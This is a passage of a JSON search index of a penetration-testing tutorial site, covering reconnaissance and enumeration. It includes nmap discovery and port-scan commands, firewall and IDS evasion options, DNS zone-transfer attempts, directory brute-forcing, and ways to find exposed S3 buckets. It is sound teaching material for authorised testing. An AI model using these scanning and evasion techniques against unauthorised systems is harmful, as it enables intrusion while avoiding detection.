    "c": "macOS enumeration  Get information from: Settings: Users and usernames Applications: some run on defaults, or there may be null or blank passwords Permissions on key directories and files Shares if macOS shares resources over the network Samba, the linux equivalent to smb, may give information about the windows network and its shares NFS information can give information on permissions and the network services Network services such as DNS , LDAP , SMTP , etc Various built-in commands and utilities Tools  macOS enumeration tools Remediation  Minimize the attack surface by removing any unnecessary or unused service. Ensure IPTables is configured to restrict the access.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "7a7948d45c2b893ccde3bfea260a6c84",
    "u": "https://enum.tymyrddin.dev/docs/app/database",
    "t": "Enumerate databases ",
    "c": "Enumerate databases  Gather information using database enumeration tools : Find a page url with a GET request parameter Test different SQL injection methods against the request parameter List information about the existing databases List information about tables present in a particular database List information about the columns of a particular table Dump the data",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "cee55ab4f5890c064bbed72e7189817c",
    "u": "https://enum.tymyrddin.dev/",
    "t": "Lay of the land ",
    "c": "Lay of the land  Move further and deeper into the scanning process to include security scanning. Enumeration is particularly useful in networks that contain unprotected network resources and services. The distinction between reconnaissance and remote enumeration is an arbitrary grey area, and during enumeration new hosts and/or services may show up, so what you can not find here you may find there . Preparation Build a local testlab Enumeration overview Systems Introduction NetBios enumeration SNMP enumeration LDAP enumeration NTP enumeration SMTP enumeration DNS enumeration macOS enumeration Linux enumeration Windows enumeration Scanning virtualised systems Scanning cloud infrastructure Web applications Introduction Dynamic web application scanning Enumerate databases Download or obtain and decompile binaries Automated vulnerability scanning Scanning an API Vulnerability identification Introduction Mapping vulnerabilities to exploits Prioritisation of vulnerabilities Discovering more vulnerabilities/exploits",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "d1fb7158db4895c0da090e1a0a4c25fd",
    "u": "https://recon.tymyrddin.dev/",
    "t": "Falconry ",
    "c": "Falconry  Getting to know the target using methods like researching publicly available information and network scanning. Preparation Build a local testlab Footprinting Introduction Gather network information Gather system information Collect organisation information Initial scanning Introduction War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion Canopy of apple-blossom Introduction Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting API Mayhem Introduction Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets Head in the clouds Introduction Mapping endpoints Investigating AWS S3 URLs Pocketful of acorns Introduction Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "54d37ed8ae0101af9f5cf86095e2c0d5",
    "u": "https://recon.tymyrddin.dev/docs/scanning/service-and-os",
    "t": "Service and OS detection ",
    "c": "Service and OS detection  Detect Operating Systems Detect services Service and OS detection use different methods to determine the operating system or service running on a particular port. Detect services: # nmap -sV -T4 -Pn -oG ServiceDetect -iL $TARGETFILE OS detection: # nmap -O -T4 -Pn -oG OSDetect -iL $TARGETFILE",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "516b73f997f19907408cf9a557036fbf",
    "u": "https://recon.tymyrddin.dev/docs/api/parameters",
    "t": "Document key parameters ",
    "c": "Document key parameters  An API’s attack surface includes the inputs and outputs of the API. Using the inputs and outputs, determine the potential vulnerabilities in the API. These inputs and outputs include: API calls URL parameters Headers Cookies Web responses File uploads API keys Identify the inputs and outputs of the API: The inputs and outputs of an API can be identified by the endpoints that the API provides. Make requests to different endpoints, interacting with the resources that the API exposes. The responses that the API sends back will contain the information necessary to understand the structure of the data being returned. Resources  API Security Top 10 2019",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17825e36126dfc3ace6f87d8ffb5728c",
    "u": "https://recon.tymyrddin.dev/docs/scanning/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Determine what hosts are available on the network, what services (application name and version) those hosts are offering, what operating systems (and OS versions) they are running, what type of packet filters/firewalls are in use … Why?  To find potential initial vulnerable attack vectors. How?  War-dialing-driving-flying-shipping Live host discovery Host discovery with ICMP (ping sweep) Host discovery with TCP Host discovery with UDP Port scanning Service and OS detection Diving deeper in discovery Defence detection Stealth scans Firewall evasion",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "738465a0e68d71e161decdd51698ce1f",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/network",
    "t": "Gather network information ",
    "c": "Gather network information  Domains Subdomains IP addresses Whois and DNS records Whois and IP Geolocation  Whois databases contain domain owners’ personal information and are maintained by the Regional Internet Registries. Thick whois contains all information from all registrars for the specified set of data. Thin whois contains limited information about the specified set of data. Whois query results typically include: Domain details Domain owner details Domain server Net range Domain expiration Creation and last update dates Regional Internet Registries, which maintain the whois databases, include: Reseaux IP Europeens Network Coordination Centre (RIPE) American Registry for Internet Numbers (ARIN) Asia-Pacific Network Information Centre (APNIC) Latin America and Caribbean Network Information Centre (LACNIC) Africa’s NIC (AFRINIC) IP Geolocation  IP geolocation helps find location information about a target such as country, city, postal code, ISP, and so on. This informationis useful for (planning) social engineering attacks on the target. DNS footprinting  DNS footprinting involves collecting information about DNS zone data, which includes information about server types and locations of key hosts in the network. Network Footprinting  Network footprinting refers to the process of collecting information about the target’s network. During this process, attackers collect network range information and use the information to map the target’s network. Network range gives attackers an insight into how the network is structured and which machines belong to the network. Nmap can be used for network discovery. It uses raw IP packets to determine the available hosts on the network, the services offered by those hosts, operating systems they are running, firewall types that are being used, and other important characteristics. Traceroute programs uses the ICMP protocol and the TTL field in the IP header to discover a route to the target host. It records IP addresses and DNS names of discovered routers underway. This information can be used for man-in-the-middle and other related attacks. The results of a traceroute can also be used to collect information about network topology, trusted routers, and firewall locations, useful for creating network diagrams and planning attacks.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "b9473199958a0f7470288675561f1f33",
    "u": "https://recon.tymyrddin.dev/docs/cloud/map",
    "t": "Mapping endpoints ",
    "c": "Mapping endpoints  Collect information to identify assets a target has across all cloud providers. Identify services hosted with third-party companies. Map out all the endpoints: user interface, APIs, subnetworks, etc. for which testing is to be done. Decide which endpoints to exclude based on policy restrictions, user permissions, etc. Decide the route for performing the pentest: from application or database. Figure out how well the application server and VMs can take the load of the tests. Find out the laws that need to be followed while performing tests. Figure out which tools to use and what types of tests to do on which endpoints (Automated or Manual). Get approval for the plan from the client and inform them when you wish to begin.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "1ff9b63c2a2b9b13ace655d24f5a3566",
    "u": "https://recon.tymyrddin.dev/docs/scanning/firewall",
    "t": "Firewall evasion ",
    "c": "Firewall evasion  Fragment packets: # nmap -f <IP> Most firewalls and IDS detect fragmented packets. The nmap --mtu command allows for specifying offset size (has to be a multiple of 8). This is similar to the packet fragmentation technique. During the scan, nmap creates packets of that size, causing confusion to the firewall. # nmap --mtu [MTU] <IP> Decoy: # nmap -D RND:[number] <IP> Idle zombie scan: # nmap -sI [zombie] <IP> Manually specify a source port: # nmap --source-port [port] <IP> Append random data: # nmap --data-length [size] <IP> Randomize target scan order: # nmap --randomize-hosts <IP> Spoof MAC address: # nmap --spoof-mac [MAC|0|vendor] <IP> Send bad checksums: # nmap --badsum <IP> The badsum command deploys an invalid TCP/UDP/SCTP checksum for packets transmitted to the target. Practically every host IP stack will correctly drop the packets, so each response accepted is possibly originating from a firewall or Intrusion Detection System that was not concerned with confirming the checksum.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "60ee3fc55140efa070290625facf78dd",
    "u": "https://recon.tymyrddin.dev/docs/scanning/tcp",
    "t": "Host discovery with TCP ",
    "c": "Host discovery with TCP  Split port scans by port number Low TCP port scans Medium TCP port scans High TCP port scans Split scans  Split the scans to get a set of results back in a shorter period of time. This makes it possible to start testing while the remaining results come back. By the time medium port scans are finished, underlying services of the lower ports have probably been enumerated. Use ports 0-1024 for the low range (System Ports). These scans cover services such as SMTP, Windows File Sharing, HTTP, HTTPS and other commonly found services. For medium port use ports 1025-32767 (the bulk of the User Ports). These cover NFS, Sun RPC Port Mapper, X-Windows, VNC, Microsoft Terminal Services, etc. The high port scans are for ports in the range 32768-65535 (the lesser used User Ports and Dynamic or Ephemeral ports). Hints  Do not ping the target in these scans because there may be filtering in place, which could result in pings failing and nmap accidentally concluding that a host is down. Under the hood  TCP SYN (Stealth) scan ( -sS ) is the default and most popular scan option for good reason. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls. SYN scan is relatively unobtrusive and stealthy, since it never completes TCP connections. It works against any compliant TCP stack, and allows clear, reliable differentiation between open, closed, and filtered states. Nmap starts by sending a TCP packet with the SYN flag set and the target send back a response with the SYN and ACK flags. NMap does not complete the handshake with the expected ACK and the OS suddenly receives a SYN/ACK while it hasn’t requested (NMap did). The OS responds to the unexpected SYN/ACK with an RST packet. All RST packets in such scenarios also have the ACK bit set because they are always sent in response to (and acknowledge) a received packet. Because the three-way handshake is never completed, SYN scan is sometimes called half-open scanning. If a service is listening on a port and someone makes a connection to it (by sending a SYN packet), the service will send a SYN/ACK packet in return. That means that there is a machine at that IP address. Note that some operating systems will respond with a SYN/ACK to SYN s sent to ports used for outbound TCP connections, while others will not. If no service is listening on that port but the machine is up and running and on the network, a reset ( RST ) packet will be sent back. That means there is nothing listening on that port, but having sent something in return means that a machine is at that IP address. If nothing is received after sending a SYN packet, it means there is no host at that IP address OR a firewall is blocking traffic OR the host is down. Port 80 is therefore extremely useful for ping sweeps, because most firewalls and port filters do not block web traffic. Send Receive Send Assumption SYN SYN/ACK ACK followed by RST Port is open, host is up SYN RST - Port is closed, host is up SYN Nothing - Port is blocked by firewall, host is down, or there is no host at that IP address. Interpreting portscan outputs  Some puzzling with indicators will help: Anything from 40000 onwards could be anything and only be temporary NFS can run on any port, but the Linux NFS Kernel server implementation always runs on port 2049 by default. VNC clients typically are on port 5900+ If port 5900 AND 5901 are open, most likely 5901 is a second VNC service. If port 5901 is open and 5900 closed, who knows? TCP port 8080 open can indicate a proxy server, or something like Apache Tomcat, or … A Windows Active Directory controller will have TCP ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 636 (LDAP/S) and the common NetBIOS and Windows File Sharing ports 135 (used for RPC comms for AD replication), 139 (Authentication) and 445 (used for a whole host of services including file sharing and authentication) Windows systems tend to use TCP port 3389 for Microsoft Remote Desktop Protocol access. Unix-like systems often use text-based protocols on TCP ports 22 (SSH), 23 (Telnet) and 514 (RSH), or network-based Windowing protocols on TCP ports such as 590x (VNC) or 600x (X11). Examples  Low TCP port scans: # nmap -sS -PN -p 0-1024 -n -iL $TARGETFILE -oA nmap/tcp-lo The result is an open port list, with port and protocol, the port’s state and the by IANA allocated service for that port. This does not mean that a port actually runs that service. Medium TCP port scans: # nmap -sS -PN -p 1025-32767 -n -iL $TARGETFILE -oA nmap/tcp-med Remaining TCP port scans: # nmap -sS -PN -p 32768-65535 -n -iL $TARGETFILE -oA nmap/tcp-hi Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9eeb2329002066a0902a656ee46d6c70",
    "u": "https://recon.tymyrddin.dev/docs/physical/facilities",
    "t": "Recon of facilities ",
    "c": "Recon of facilities  Organisations can use a number of physical security controls to regulate who gains access to the facility or what areas in the facility they gain access to. See if you can bypass the security to gain access to areas of facilities you should not have access to. Resources  Guidelines for Performing Physical Security Tests on Facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "439632600c2c42ec4725efa6ef2a8c2e",
    "u": "https://recon.tymyrddin.dev/docs/cloud/s3-urls",
    "t": "Investigating AWS S3 URLs ",
    "c": "Investigating AWS S3 URLs  Endpoints  S3 endpoint is a region-specific URL that is used in both S3 URL styles. Most of the endpoints follow this pattern (with region names being eu-west-1 , us-west-2 , etc): s3-REGION.amazonaws.com And there are some oddities useful to know. Two endpoints that do not follow the above pattern are those of the us-east-1 region. For that region endpoints are synonyms and both point to the same place: s3.amazonaws.com s3-external-1.amazonaws.com Further, the eu-central-1 (Frankfurt) and ap-northeast-2 (Seoul) regions both have one endpoint that follows the general pattern and one alias endpoint that differs from the general scheme in one symbol (the first dash is replaced by dot): s3-eu-central-1.amazonaws.com s3.eu-central-1.amazonaws.com s3-ap-northeast-2.amazonaws.com s3.ap-northeast-2.amazonaws.com S3 bucket URL schemes  According to the S3 Developer Guide (PDF, p.57), S3 supports both virtual-hosted and path URL styles for bucket access. Path style URL  In path style URL, the bucket name is appended to the domain name and is a part of the URL path: http://s3endpoint/<bucket-name> Virtual-hosted style URL  In virtual-hosted style URL the bucket name becomes a subdomain: http://BUCKET.s3endpoint Static Website Hosting Endpoints  Using S3’s Static Website Hosting feature requires using Website Endpoints. There are two general forms of S3 website endpoint: http://BUCKET.s3-website-region.amazonaws.com http://BUCKET.s3-website.region.amazonaws.com Most of the regions follow the first form, while eu-central-1 and ap-northeast-2 follow the second. Presigned URL  Users can create a presigned URL for an object, for which security credentials, a bucket name, an object key, an HTTP method (GET to download the object), and an expiration date and time are given. The presigned URLs are valid only for the specified duration. If a presigned URL is made using a temporary token, then the URL expires when the token expires, even if the URL was created with a later expiration time. Anyone who receives the presigned URL can then access the object. Because presigned URLs grant access to the Amazon S3 buckets to whoever has the URL, Amazon recommends they be protected appropriately . Something often forgotten, apparently. Getting it, but not quite.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "117bf72c53eedd74731f47621540303a",
    "u": "https://recon.tymyrddin.dev/docs/cloud/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Cloud recon. Focus on S3 first. The growing number of Amazon Web Services S3 “data leaks” are due to human intervention – specifically, users who have not correctly configured S3 bucket policies, and as a result, allow public access to S3. In general, a lack of understanding when implementing S3, or carelessness when evaluating what should or should not be available for public consumption. Why?  To gain information for initial access in the cloud. How?  Mapping endpoints and plan Investigating AWS S3 URLs",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "99f2c2f99f7d5f85c1898215c9e40a69",
    "u": "https://recon.tymyrddin.dev/docs/api/secrets",
    "t": "Check for exposed secrets ",
    "c": "Check for exposed secrets  The authentication mechanism is used to identify the user and ensure that they are authorized to access the API. The authentication mechanism is usually a username and password, but it can also be a token or a certificate. It also gives clues to potential vulnerabilities in the API. If the authentication mechanism is weak, then the API is more vulnerable to attack. Resources  API Security Top 10",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dd3825e3f3fb61448b666dffc1f7a801",
    "u": "https://recon.tymyrddin.dev/docs/app/techstack",
    "t": "Tech stack fingerprinting ",
    "c": "Tech stack fingerprinting  Fingerprinting techniques can help you understand the target application even better. Fingerprinting is identifying the software brands and versions that a machine or an application uses. This information allows you to perform targeted attacks on the application, because you can search for any known misconfigurations and publicly disclosed vulnerabilities related to a particular version. Run Nmap on a machine with the -sV flag on to enable version detection on the port scan. In Burp, send an HTTP request to the server to check the HTTP headers used to gain insight into the tech stack. Many web frameworks or other technologies will embed a signature in source code. Right-click a page, select View Source Code , and press CTRL-F to search for phrases like powered by , built with , and running . Check technology-specific file extensions, filenames, folders, and directories. Wappalyzer is a browser extension that identifies content management systems, frameworks, and programming languages used on a site. BuiltWith is a website that shows you which web technologies a site is built with. StackShare is an online platform that allows developers to share the tech they use. Maybe the organisation’s developers have posted their tech stack. And Retire.js is a tool that detects outdated JavaScript libraries and Node.js packages.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8a266ac0d06711e4fbb3260fc2906110",
    "u": "https://recon.tymyrddin.dev/docs/scanning/stealth",
    "t": "Stealth scans ",
    "c": "Stealth scans  Stealth  Never use connect scan ( -sT ), which establishes a full connection to a port, if one wishes to remain stealthy. Excessive port connections can create a DoS condition on older boxes, and will raise the alarms on any IDS. Use a stealthy port-scanning method with nmap, such as a TCP SYN scan (sometimes called a half-open scan). It is not only stealthy, it is also lighter on both systems, source and target. Mask your IP from the target (Don’t expect to find possibilities for either of these two all the time, but do keep looking, especially among older systems not offering useful services.): Use an FTP bounce scan if possible. Some ftp servers allow anonymous users to proxy connections to other systems. If you find an anonymous ftp server during enumeration, or you know of one to which you have login credentials, try using the -b option with user:pass@server:ftpport . If the server does not require authentication, you can skip the user:pass and if it is running on the standard port you can also leave out the ftpport part. This only works on some ftp servers. Many ftp servers today have this option disabled (by default). Idle scan gives a similar result but uses a different type of scanning. If you can identify an intermediate machine (a zombie) with low traffic and predictable fragment identification values (IP ID) you can send spoofed packets to your target, with the source set to the zombie with -sI zombiehost:port . An IDS will see the idle scan target as the system doing the scanning. If the idle target is a by your target trusted machine that can bypass host-based access control lists, jackpot!",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6342ea6759dd923f27e88734c46e6acf",
    "u": "https://recon.tymyrddin.dev/docs/app/stroll",
    "t": "Manually walk through the target ",
    "c": "Manually walk through the target  Manually walk through the application to learn more about it. Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don’t usually use. Get a rough idea of what the attack surface (all the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e6271cfa9c8df69dc86ca8854add5e18",
    "u": "https://recon.tymyrddin.dev/docs/scanning/icmp",
    "t": "Host discovery with ICMP ",
    "c": "Host discovery with ICMP  The easiest and fastest way to discover if a host is up or not is by trying to send some ICMP packets. Send an echo request using a simple ping or fping (for ranges). If pinging a single host works, try a ping-sweep: Send out ICMP echo requests to every system on a particular network or subset of a network to determine which hosts are up. ICMP error messages can be used to mask the source of a Distributed Denial of Service attack, and with such attacks being common, ICMP error rate limiting is often applied. To avoid filters to common ICMP echo request-response, use nmap to send other types of ICMP packets. If scans still take incredibly long, try discovering hosts with a SYN scan or UDP scan instead. Examples  Send a single echo request # ping -c 1 192.168.122.10 Send echo requests to ranges: # fping -g 192.168.122.0/24 Using nmap, send echo, timestamp requests and subnet mask requests: # nmap -PEPM -sP -n 192.168.122.0/24",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "669a9cd0954ec976c9347b7e46848a15",
    "u": "https://recon.tymyrddin.dev/docs/scanning/hosts",
    "t": "Live host discovery ",
    "c": "Live host discovery  Types of scans  ARP, ICMP, TCP, and UDP can detect live hosts. Any response from a host is an indication that it is online. Scan Type Example Command ARP Scan sudo nmap -PR -sn /24 ICMP Echo Scan sudo nmap -PE -sn /24 ICMP Timestamp Scan sudo nmap -PP -sn /24 ICMP Address Mask Scan sudo nmap -PM -sn /24 TCP SYN Ping Scan sudo nmap -PS22,80,443 -sn /30 TCP ACK Ping Scan sudo nmap -PA22,80,443 -sn /30 UDP Ping Scan sudo nmap -PU53,161,162 -sn /30 Options  Option Purpose -n no DNS lookup -R reverse-DNS lookup for all hosts -sn host discovery only",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c795c53795ef1db0037e6f7bdcee1f11",
    "u": "https://recon.tymyrddin.dev/docs/api/collect-data",
    "t": "Collect data ",
    "c": "Collect data  Collect data from applications through automated and manual means. Scan for open ports and services using shodan Use an application as intended Inspect web application with DevTools Search for API-related directories Discover API endpoints From here: an entry point (typically using the root URI of “/”) contains links to other REST APIs. Those APIs will contain links to other APIs and so on. Ideally, there is no API that does not have a link to it. Tools  Kiterunner Nikto OWASP ZAP",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0aa1ce3d047d15d68e4a4414feb546fc",
    "u": "https://recon.tymyrddin.dev/docs/scanning/udp",
    "t": "Host discovery with UDP ",
    "c": "Host discovery with UDP  Split port scans by port number Low UDP port scans Remaining UDP port scans Relationship with ICMP  UDP is a stateless protocol. It was designed for applications that do not care whether a packet is received. This could saturate a link, and ICMP is used in its congestion control. Because UDP is stateless, it is easy to spoof using ICMP error messages to mask the source of a Distributed Denial of Service attack, and with such attacks common, UDP scans are considered bad and ICMP error rate limiting good. With 65,535 ports to scan and error rate limits of 1 ICMP message per second, it can take 9+ hours to scan some hosts. Solutions are scanning multiple hosts in parallel, scanning popular ports first, and ignoring ports that require specific protocols and scanning those separately. Older versions of Windows (and some configurations of current Windows systems) do not implement ICMP error rate limiting. Knowing beforehand which are Windows systems, these can be put on a separate IP list. Not responding  UDP services are highly unlikely to respond to a regular empty UDP probe datagaram because the underlying application does not receive a packet that causes it to respond. The solution is to send a packet related to the most likely service (based on port number) running under it. For example, brute forcing SNMP on port 161 could be worthwhile and sending a correctly formed DNS query datagram to UDP port 53 will likely give a useful response. Interpreting portscan outputs  nmap will report a lot of closed ports, and some as open|filtered . The latter means that nmap did not receive a response. Use a combination of ICMP and IP to whittle things down: An open port will respond to a correctly formed application message if the service is supposed to respond to that message A closed port will lead to an ICMP port unreachable from the device (or a similar destination unreachable message from a nearby device) A filtered port will occasionally result in a message, but more often than not, nothing If a packet’s TTL expires an ICMP TTL Expired In Transit message is sent from the router the datagram is currently passing through to the packet’s source Examples  Low UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 0-1024 -oA nmap/udp-lo -sV Expect to find 53, 111 and 137 open. Remaining UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 1025-65535 -oA nmap/udp-full -sV Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5b01e41888e428481743749b796e42f7",
    "u": "https://recon.tymyrddin.dev/docs/scanning/ports",
    "t": "Port scanning ",
    "c": "Port scanning  Types of scans  Port Scan Type Example Command TCP Connect Scan nmap -sT TCP SYN Scan sudo nmap -sS UDP Scan sudo nmap -sU TCP Null Scan sudo nmap -sN TCP FIN Scan sudo nmap -sF TCP Xmas Scan sudo nmap -sX TCP Maimon Scan sudo nmap -sM TCP ACK Scan sudo nmap -sA TCP Window Scan sudo nmap -sW Custom TCP Scan sudo nmap --scanflags URGACKPSHRSTSYNFIN Spoofed Source IP sudo nmap -S SPOOFED_IP Spoofed MAC Address --spoof-mac SPOOFED_MAC Decoy Scan nmap -D DECOY_IP,ME Idle (Zombie) Scan sudo nmap -sI ZOMBIE_IP Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Options  Option Purpose -p- all ports -p1-1023 scan ports 1 to 1023 -F 100 most common ports -r scan ports in consecutive order -T<0-5> T0 being the slowest and T5 the fastest --max-rate 50 rate <= 50 packets/sec --min-rate 15 rate >= 15 packets/sec --min-parallelism 100 at least 100 probes in parallel --source-port PORT_NUM specify source port number --data-length NUM append random data to reach given length Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports. Option Purpose --reason explains how Nmap made its conclusion -v verbose -vv very verbose -d debugging -dd more details for debugging",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "682e6c01de9ffba0dd3f030fb4db3374",
    "u": "https://recon.tymyrddin.dev/docs/app/dns",
    "t": "Scope discovery ",
    "c": "Scope discovery  Gather deeper and wider Discover websites on the same server Discover subdomains Discover email addresses Discover sensitive files WHOIS and Reverse WHOIS  Use whois to gather Domain name, IP address, Administrative Details, autonomous system number, DNS Go to www.arin.net/whois and search for target name in the ARIN Whois/RDAP Search bar. Find a handle which displays more information about this registration including the range of IP addresses. Find an entry with a net range (public IPs). Determine all the public IP blocks the target may have. If you cannot find any results try some other Whois database search sites. IP addresses  nslookup www.target.com Setting the type of query to MX (mail exchange) records: nslookup set type=MX target.com Then use nslookup again to resolve the FQDNs of the mail servers to IP adressess. Try a DNS zone transfer: nslookup server <ip_or_fqdn_of_target_DNS_server> set type=all ls -d <target_domainname> If successful, make a note of it and add it to the remediation list in the pentest report. Researching certificates  Another way of finding hosts is to take advantage of the Secure Sockets Layer(SSL) certificates used to encrypt web traffic. An SSL certificate’s Subject Alternative Name field lets certificate owners specify additional hostnames that use the same certificate, so you can find those hostnames by parsing this field. Use online databases like crt.sh , Censys , and Cert Spotter to find certificates for a domain. 👉 Wildcard certificates are a single point of failure. If we stumble upon the private key while roaming the network, we could intercept the communication flow of all applications using that same parent domain. When a certificate authority issues a certificate, these are entered into a central repository called a certificate log. This repository keeps a binary tree of all certificates, where each node is the hash of its child nodes, thereby guaranteeing the integrity of the entire chain. All issued TLS certificates should be publicly published to detect domain spoofing, typo-squatting, homograph attacks, and other mischievous ways to deceive and redirect users. These logs can be searched. Secret applications with little security hiding behind proxies can be exposed, and minimally subdomain enumeration is way faster. Subdomain enumeration  After finding as many domains on the target as possible, locate as many subdomains on those domains as you can. Each subdomain represents a new angle for attacking the network. The best way to enumerate subdomains is to use automation. Tools like Sublist3r , SubBrute , Amass , and Gobuster can enumerate subdomains automatically with a variety of wordlists and strategies. For example, Sublist3r works by querying search engines and online subdomain databases, while SubBrute is a brute-forcing tool that guesses possible subdomains until it finds real ones. Amass uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases to find subdomains. You can build a tool that combines the results of multiple tools to achieve the best results. Service Enumeration  Next, enumerate the services hosted on the machines you’ve found. Since services often run on default ports, a good way to find them is by port-scanning the machine with either active or passive scanning. In active scanning, you directly engage with the server. Active scanning tools send requests to connect to the target machine’s ports to look for open ones. You can use tools like nmap or masscan for active scanning. In passive scanning, third-party resources are in use to learn about a machine’s ports without interacting with the server. Passive scanning is stealthier and helps attackers avoid detection. To find services on a machine without actively scanning it, you can use Shodan , Censys and Project Sonar . Combine the information gathered from different databases for the best results. Enumerate webserver directories  The next thing you can do to discover more of the site’s attack surface is brute-force the directories of the web servers you’ve found. Finding directories on servers is valuable, because through them, you might discover hidden admin panels, configuration files, password files, outdated functionalities, database copies, and source code files. Directory brute-forcing can sometimes allow you to directly take over a server. Even if you can’t find any immediate exploits, directory information often tells you about the structure and technology of an application. The nmap NSE script http-enum.nse offers a quite extensive fingerprint, especially when including Nikto database, but there are no guarantees all will be seen. And Nikto is very noisy. You can use Dirsearch or Gobuster for directory brute-forcing. These tools use wordlists to construct URLs, and then request these URLs from a web server. If the server responds with a status code in the 200 range, the directory or file exists. This means you can browse to the page and see what An example of running a Dirsearch command. The -u flag specifies the hostname, and the -e flag specifies the file extension to use when constructing URLs: ./dirsearch.py -u target_url -e php Gobuster’s dir mode can be used to find additional content on a specific domain or subdomain. This includes hidden directories and files. In this mode, you can use the -u flag to specify the domain or subdomain you want to brute-force and -w to specify the wordlist you want to use: gobuster dir -u target_url -w wordlist Manually visiting all the pages you’ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like EyeWitness or Snapper to automatically verify that a page is hosted on each location. EyeWitness accepts a list of URLs and takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. Keep an eye out for hidden services, such as developer or admin panels, directory listing pages, analytics pages, and pages that look outdated and ill-maintained. These are all common places for vulnerabilities to manifest. Spidering the site  Another way of discovering directories and paths is through web spidering, or web crawling, a process used to identify all pages on a site. A web spider tool starts with a page to visit. It then identifies all the URLs embedded on the page and visits them. By recursively visiting all URLs found on all pages of a site, the web spider can uncover many hidden endpoints in an application. OWASP Zed Attack Proxy (ZAP) has a built-in web spider, and Burp Suite has an equivalent tool called the crawler. Third-party hosting  Take a look at the company’s third-party hosting footprint. For example, look for the organisation’s S3 buckets. A way to find those is through Google dorking. site:s3.amazonaws.com COMPANY_NAME site:amazonaws.com COMPANY_NAME If the company uses custom URLs for its S3 buckets, try more flexible search terms instead. Companies often still place keywords like aws and s3 in their custom bucket URLs: amazonaws s3 COMPANY_NAME amazonaws bucket COMPANY_NAME amazonaws COMPANY_NAME s3 COMPANY_NAME Another way of finding buckets is to search a company’s public GitHub repositories for S3 URLs. Try searching these repositories for the term s3 . GrayhatWarfare is another online search engine you can use to find publicly exposed S3 buckets. And you can try to brute-force buckets by using keywords. Lazys3 is a useful tool for that. It relies on a wordlist to guess buckets that are permutations of common bucket names. Bucket Stream parses certificates belonging to an organisation and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also automatically checks whether the bucket is accessible. Once you’ve found a couple of buckets that belong to the target organisation, use the AWS command line tool to see if you can access one. Install the tool with: pip...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "96231753af2d5325a33d6b571575598f",
    "u": "https://recon.tymyrddin.dev/docs/physical/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gather information to create an operations plan. In some cases, the client will provide much of the information, like vendors used, photographs of the locations, floorplans, front desk procedures, dress codes, photos of badges, security systems in place. If not, do recon. Why?  Identify vulnerabilities and weaknesses in physical security controls. How?  Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5a05f62e88cc94afbe9f6b33a26b11d7",
    "u": "https://recon.tymyrddin.dev/docs/api/burp",
    "t": "Analyse traffic ",
    "c": "Analyse traffic  Pass web service application traffic through a proxy to gather more detail. Using a proxy helps dig into a website and look for vulnerabilities. FoxyProxy is a Firefox extension for switching an internet connection between proxy servers based on URL patterns. It simplifies configuring browsers to access proxy servers. Burp Suite is a popular penetration testing and vulnerability finder tool for checking web application security. To discover hidden flaws, route traffic through a proxy like Burp Suite. FoxyProxy can be used to turn it on and off.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f4610429197f0979ce6050fa01a81bc3",
    "u": "https://recon.tymyrddin.dev/docs/api/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Locate the APIs and validate whether they are operational, find credential information (keys, secrets, usernames, passwords), version information, API documentation, and information about the API’s purpose. Why?  The more information gathered about a target, the better the odds of discovering and exploiting API-related vulnerabilities. How?  Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8ba3d3d5b3212810790cf7755baf5a35",
    "u": "https://recon.tymyrddin.dev/docs/app/readme",
